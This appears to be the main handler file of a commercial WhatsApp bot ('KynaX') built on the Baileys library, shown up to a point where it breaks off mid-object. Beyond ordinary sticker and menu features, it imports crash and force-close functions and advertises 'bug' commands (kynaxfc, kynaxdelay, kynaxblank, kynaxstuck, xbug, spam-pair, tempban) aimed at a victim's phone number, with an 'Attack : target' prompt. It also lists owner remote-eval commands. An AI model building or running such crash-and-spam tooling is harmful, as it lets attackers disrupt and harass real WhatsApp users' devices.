/*
 [ Credits ]
  # YifanModss
  - WhatsApp: 6282118412445
  - Telegram: @yifanmodss
  - YouTube: @yifanoffc
  Thanks Buyer!
*/
console.clear();
require('./database/settings')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const pino = require('pino')

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix

const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1')

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const isGroup = m.chat.endsWith('@g.us')
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const text = q = args.join(" ");
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const ImageBugs = [
    "https://files.catbox.moe/4xskbt.jpg",
    "https://files.catbox.moe/0d2k64.jpg",
    "https://files.catbox.moe/zc8djm.jpg"
];
const RandomBugs = ImageBugs[Math.floor(Math.random() * ImageBugs.length)];
const imageList = [
    "https://files.catbox.moe/eqbwph.jpg",
    "https://files.catbox.moe/zc8djm.jpg",
    "https://files.catbox.moe/4xskbt.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];
const everykynax = fs.readFileSync('./database/pusat/image/KY.jpg')
const babi = fs.readFileSync('./database/pusat/image/KY.jpg')

let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const sendReact = async (emote = "🔥") => {
  await sock.sendMessage(m.chat, {
   react: {
    text: emote,
    key: m.key,
     },
    })
   }
const react2 = async (emote = "✅") => {
  await sock.sendMessage(m.chat, {
   react: {
    text: emote,
    key: m.key,
     }
    })
   }
const { tiktok } = require('./database/pusat/Data5')
const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2')

if (!sock.public) {
if (!DevOnly) return
}

if (command) {
  if (m.isGroup) {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // delete
}

var example = (teks) => {
return `Example : ${command} ${teks}`
}

// Exports All Function YifanTzyy
const { upinipin, CrashMemek, buttonnull, ForcloseNgt, sendOfferCall, stellarbriliance7, stellarbriliance8, blank } = require('./database/pusat/functbug.js')

sock.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await sock.sendPresenceUpdate('composing', jid)
      return sock.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xreplyWithButton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363422040633302@newsletter",
        serverMessageId: null,
        newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const xreplybugbutton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
      }
    },
    {
    buttonId: '.getsc',
    buttonText: {
      displayText: '༑⌁⃰𝐆𝐞𝐭 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomBugs },
    caption: teks,
    footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 15,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363422040633302@newsletter",
        serverMessageId: null,
        newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const kontolreply = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐊͢𝐲͡𝐧𝐚͜𝐗͢ 𝐈͡𝐧𝐯𝐢͜𝐜𝐭𝐮͢𝐬͡ 🐉`,
                body: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: `https://t.me/yifanmodss`
            }
        }
    }, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `Ɣ\n𝐂𝐨𝐦𝐦𝐚𝐧𝐝: ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
		
const ThumbUrl = "https://j.top4top.io/p_3319xbxss1.jpeg"
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐊͢𝐲͡𝐧𝐚͜𝐗͢ 𝐈͡𝐧𝐯𝐢͜𝐜𝐭𝐮͢𝐬͡ 🐉`,
                    body: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@yifanoffc`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        xreplyWithButton('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
  
//—= Menu KynaX Invictus =—
const RunTime = `_${runtime(process.uptime())}_`
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
case 'menu':
case 'kynax': {
await sendReact()
sock.sendMessage(m.chat, { audio: fs.readFileSync('./ysound.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: lol })
await sleep(1000)
await react2()
  let limitnya = useLimit;
  let Menu = `*› — ( 🐉 ) Assalamu'alaikum Ya Akhi, Anâ KynaX, Anaddarsa fî JavâScript... ${info}*
\`\`\`*"Anâ Uhibbu JavâScript"*\`\`\`

${ucapanWaktu}

\`› # Information  Script ‹\`
\`⾒\` *Developer :* YifanModss
\`⺙\` *Name Script :* KynaX
\`⺓\` *Verison Script :* 6.0
\`の\` *Languange:* Arábiyyah • JavâScript
\`グ\` *Mode Bot:* ${sock.public ? "Public 開" : "Private 用"}
\`ボ\` *Status User:* ${DevOnly ? "Owner 公" : PremOnly ? "Premium プム" : "User"}
\`見 Runtime : ${runtime(process.uptime())}\`
`;
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363422040633302@newsletter",
      serverMessageId: null,
      newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "𝕭𝖚𝖌 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.ownmenu`
            }
          ]
        },
        {
              title: "⌜ 𝐊͢𝐲͡𝐧𝐚͜𝐗͢ Ϟ 但 ⌟",
          highlight_label: "",
          rows: [
            {
              header: "",
              title: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔",
              description: "",
              id: `.tqto`
            }
          ]
        },
        {
          title: "⌜ 𝐗𝐕𝐈𝐏  ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "⌜ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 - 但 ⌟",
              description: "",
              id: `.owner`
            },
            {
              header: "",
              title: "⌜ 𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭 - 但 ⌟",
              description: "",
              id: `.buysc`              
            },
            {
              header: "",
              title: "⌜ 𝐆𝐞𝐭 𝐒𝐜𝐫𝐢𝐩𝐭 - 但 ⌟",
              description: "",
              id: `.getsc`
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break
case 'bugmenu': {
await sendReact()
await sleep(1000)
await react2()
let limitnya = useLimit
let Menu = `*› — ( 🐉 ) Assalamu'alaikum Ya Akhi, Anâ KynaX, Anaddarsa fî JavâScript... ${info}*
\`\`\`*"Anâ Uhibbu JavâScript"*\`\`\`
 
 —= *Button Type* =—
│› xbug 628×× [ Button Bug ]
│› spammenu 628××× [ Button Spam ]
—= *Command Type* =—
│› kynaxfc 628xxx [ Command ]
│› kynaxdelay 628xxx [ Command ]
│› kynaxblank 628xxx [ Command ]
│› kynaxstuck 628xxx [ Command ]
│› kynaxproto 628xxx [ Command ]
│› kynaxptocol 628xxx [ Command ]

\`クラッシャーフォーエックス\`
*Press The Menu Button Below 🩸*`
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 200,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363422040633302@newsletter",
      serverMessageId: null,
      newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "𝕭𝖚𝖌 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.ownmenu`
            }
          ]
        },
        {
              title: "⌜ 𝐊͢𝐲͡𝐧𝐚͜𝐗͢ Ϟ 但 ⌟",
          highlight_label: "",
          rows: [
            {
              header: "",
              title: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔",
              description: "",
              id: `.tqto`
            }
          ]
        },
        {
          title: "⌜ 𝐗𝐕𝐈𝐏  ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "⌜ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 - 但 ⌟",
              description: "",
              id: `.owner`
            },
            {
              header: "",
              title: "⌜ 𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭 - 但 ⌟",
              description: "",
              id: `.buysc`              
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol2 });
}

break
case 'ownmenu': {
await sendReact()
await sleep(1000)
await react2()
let limitnya = useLimit
let Menu = `*› — ( 🐉 ) Assalamu'alaikum Ya Akhi, Anâ KynaX, Anaddarsa fî JavâScript... ${info}*
\`\`\`*"Anâ Uhibbu JavâScript"*\`\`\`

\`› # Information  Script ‹\`
\`⾒\` *Developer :* YifanModss
\`⺙\` *Name Script :* KynaX
\`⺓\` *Verison Script :* 6.0
\`の\` *Languange:* Arábiyyah • JavâScript
\`グ\` *Mode Bot:* ${sock.public ? "Public 開" : "Private 用"}
\`ボ\` *Status User:* ${DevOnly ? "Owner 公" : PremOnly ? "Premium プム" : "User"}
\`見 Runtime : ${runtime(process.uptime())}\`

「 \`Pribadi/Pemilik/Owner Menu\` 」
│ self *‹62xxx›*
│ public *‹62xxx›* 
│ addprem *‹62xxx›*
│ delprem *‹62xxx›*
│ addowner *‹62xxx›*
│ delowner *‹62xxx›* 
│ setpp *‹62xxx›*
│ delpp *‹62xxx›*
│ =>
│ >
│ $

「 \`Group Menu\` 」
│ kick *‹62xxx›*
│ tagall *‹TagMember›*
│ linkgroup *‹InGroup›*
│ resetlinkgc *‹InGroup›*
│ join *‹LinkGroup›*

「 \`Tolls Menu\` 」
│ tempban *‹62xxx›*
│ spam-pair *‹62xxx›*
│ reactch *‹LinkChannel›*
│ tourl *‹Reply/Image›*
│ brat *‹Text›*
│ rvo *‹Video/Image›*
│ meta *‹meta ai›*
│ cekidch *‹linkch›*
│ spammenu

「 \`Fun Menu\` 」
│ tiktok *‹Reply/Link›*
│ play *‹SearchMusic›*
│ tovn *‹Reply/Image›*
│ sticker *‹Reply/Image›*
│ qc *‹Text›*
│ tqto *‹thanks to›*`
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363417794292944@newsletter",
      serverMessageId: null,
      newsletterName: `Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "𝕭𝖚𝖌 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.ownmenu`
            }
          ]
        },
        {
              title: "⌜ 𝐊͢𝐲͡𝐧𝐚͜𝐗͢ Ϟ 但 ⌟",
          highlight_label: "",
          rows: [
            {
              header: "",
              title: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔",
              description: "",
              id: `.tqto`
            }
          ]
        },
        {
          title: "⌜ 𝐗𝐕𝐈𝐏  ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "⌜ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 - 但 ⌟",
              description: "",
              id: `.owner`
            },
            {
              header: "",
              title: "⌜ 𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭 - 但 ⌟",
              description: "",
              id: `.buysc`              
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol2 });
}
		break
case 'addadmin':
case 'promote':
case 'adm': {
await sendReact()
if (!DevOnly) return kontolreply('*👑 Only For YifanTZyy*')

let ygdiadd = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!ygdiadd) return xreplyWithButton(`❗*Mn Org yg Mw Lu Adminin?*\nExample: adm reply_pesan_yg_mw_di_add/tag`);

if (db.admins.includes(ygdiadd)) return xreplyWithButton(`❌ *Gbs Anjer, DIA TU UDH ADMIN/PEMILIK GB ni`);

db.admins.push(ygdiadd);
await kontolreply(`✅ *done tuan.* - add\n@${target.split('@')[0]}`, { mentions: [ygdiadd] });
await react2()
}
break

case 'deladmin':
case 'demote':
case 'dadm': {
await sendReact()
if (!DevOnly) return;

let ygdidel = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!ygdidel) return xreplyWithButton(`❗*Mn Org yg Mw Lu UnAdmin?*\nExample: dadm reply_pesan_yg_mw_di_del/tag`);

if (!db.admins.includes(ygdidel)) return xreplyWithButton(`❌ *Gw Gbs, Soalny Dia Tu..., GA ADMIN KONTOL!*`);

db.admins = db.admins.filter(a => a !== ygdidel);
await kontolreply(`✅ *done tuan.* - del\n@${target.split('@')[0]}`, { mentions: [target] });
await react2()
}
break

case 'xbug':
case 'type-bug': {
if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
    mentionedJid = m.mentionedJid[0]; // ambil yang pertama ditag
} else {
    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
    mentionedJid = `${jidx}@s.whatsapp.net`;
}

let target = mentionedJid;
    
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomBugs },
  caption: `*— ( 🐉 ) ⾷ Olaa... ${info}*
> My Owner and My Developer ( Tn. YifanModss ) 👑

\`クラッシャーフォーエックス\`
*—=# Attack : ${target} #=—*
*Sellect This Type Bugs 🗿🔥*`,
  footer: 'Ɣ𝐢͡𝐟𝐚͜𝐧𝐌͢𝐨͡𝐝𝐬𝐬',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
